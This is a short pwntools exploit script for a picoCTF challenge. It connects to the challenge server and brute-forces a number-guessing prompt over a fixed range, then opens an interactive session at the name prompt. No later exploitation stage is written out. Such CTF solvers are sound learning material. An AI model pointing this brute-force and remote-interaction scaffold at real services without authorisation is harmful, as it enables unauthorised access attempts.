from pwn import *

exe = ELF("./vuln")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])

    else:
        r = remote("jupiter.challenges.picoctf.org", 15815)

    return r

def main():

    r = conn()
    # r = gdb.debug(exe.path, '''
    #     break *0x080487e9
    #     continue
    #     ''')

    stage1_bfa(r)

    res = r.recvuntil(b'Name? ')
    print("stdout : ", res)

    r.interactive()

def stage1_bfa(r):
    print("[DEBUG] ------- stage1 -------")

    for i in range(-3763, 4096):
        print(r.recvuntil(b'like to guess?'))

        payload = str(i).encode()

        r.sendline(payload)
        # print("stdin  : ", payload)

        res = r.recvline()
        # print("stdout : ", res)

        res = r.recvline()
        # print("stdout : ", res)

        if b'Nope' in res:
            print("[DEBUG] No Hit!!!")
        else:
            print("[DEBUG] Hit!!!!!! ", i)
            break

if __name__ == "__main__":
    main()
